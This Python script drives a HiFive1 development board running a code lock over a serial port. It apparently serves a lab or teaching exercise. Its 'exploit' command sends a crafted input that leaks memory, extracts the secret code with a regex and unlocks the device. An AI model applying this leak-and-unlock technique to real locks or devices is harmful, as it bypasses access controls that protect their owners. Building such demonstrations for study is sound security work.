#!/usr/bin/python3
import serial
import sys
import re
from time import sleep
from string import printable

#this function is the main body of the code and runs in a loop, allowing you to re-lock the arduino without ever leaving the program
def loop(): 

	def print_returned_message(received_bytes):
		for byte in received_bytes:
			if chr(byte) in printable:
				print(chr(byte), end="")
			else:
				print(" {} ".format(hex(byte)), end="")

	def format_message(message):
		return bytes(message + "\n", "ascii")
		
	def print_usage():
		print("\nAvailable commands are:")
		print("<any string>: the string will be passed to the hifive1 as an attempted code.")
		print("re-lock: allows you to manually reset the hifive1 as the program waits.")
		print("exploit: attempt to exploit the hifive1's vulnerability to get the code.")
		print("exit: exit the program.\n")
	
	print("Waiting until locked.")
	
	while (hifive1.in_waiting < 12):
		sleep(0.1)
	
	print("Hifive1 locked.")

	if loop_count == 0:
		print_usage()

	print(hifive1.read(13).decode(), end="")

	while True:
		user_in = input()
		if user_in == "exit":
			sys.exit(0)
		elif user_in == "re-lock":
			return
		
		elif user_in == "exploit":
			secret_regex = re.compile("[0-9A-F]{6,8}")
			hifive1.write(format_message("\x13\x37"*6 + "+")) # 3 words + 1 byte
			returned_bytes = hifive1.read(500)
			success = False
			if len(returned_bytes) > 20:
				secrets = [secret.zfill(8) for secret in secret_regex.findall("".join(chr(i) for i in returned_bytes if chr(i) in printable))]
				# join all the printable characters from the bytes after position 13 in the byte array 
				# returned by hifive1.read(500) and pass that into a regex for a 6 to 8 digit hex number 
				for secret in secrets:
					if secret not in "0"*8 + "7"*8:
						print("Exploit found this secret: " + secret)
						print("Unlocking device.")
						hifive1.write(format_message(secret))
						print("Vulnerability successfully exploited.")
						success = True
			hifive1.write(format_message("\n"))
			hifive1.read(500)
			if not success:	
				print("Exploit failed, secret not found.")
			print("Enter code: ", end="")

		else:
			hifive1.write(format_message(user_in))
			print("Attempting code: ", end="")
			print_returned_message(hifive1.read(500))


print("Connecting to hifive1.")

READTIMEOUT = 0.1
# check that ttyUSBx is correct
try:
	hifive1 = serial.Serial("/dev/ttyUSB1", 9600, timeout=READTIMEOUT)
except IOError as e:
	print("Please plug hifive1 in.")
	print("When the hifive1 is plugged in, please enter: \"in\".")
	# wait for user to enter in - prevents accidental keypresses etc 	
	while input() != "in":
		sleep(0.1)
	
	try:
		hifive1 = serial.Serial("/dev/ttyUSB1", 9600, timeout=READTIMEOUT)
	except IOError as e:
		print("Still can't find the hifive1.")
		print("\nIf already plugged in: use the arduino IDE to find the correct ttyUSBx.\n")
		print("Enter which ttyUSBx to use(default=1):")
		tty_number = input()

		try:
			hifive1 = serial.Serial("/dev/ttyUSB" + tty_number, 9600, timeout=READTIMEOUT)
		except IOError as e:
			print("That failed, enter: \"exit\" to quit program.")
			while True:
				print("Enter which ttyUSBx to use:")
				tty_number = input()
				if tty_number.upper() in ["EXIT", "\"EXIT\"", "I'M A TECHNOPHOBE GET ME OUT OF HERE!"]:
					sys.exit(0)
				try:
					hifive1 = serial.Serial("/dev/ttyUSB" + tty_number, 9600, timeout=READTIMEOUT)
					break
				except IOError as e:
					print("that failed, enter: \"exit\" to quit program")

loop_count = 0
# run the loop function forever
while True: 
	loop()
	loop_count += 1

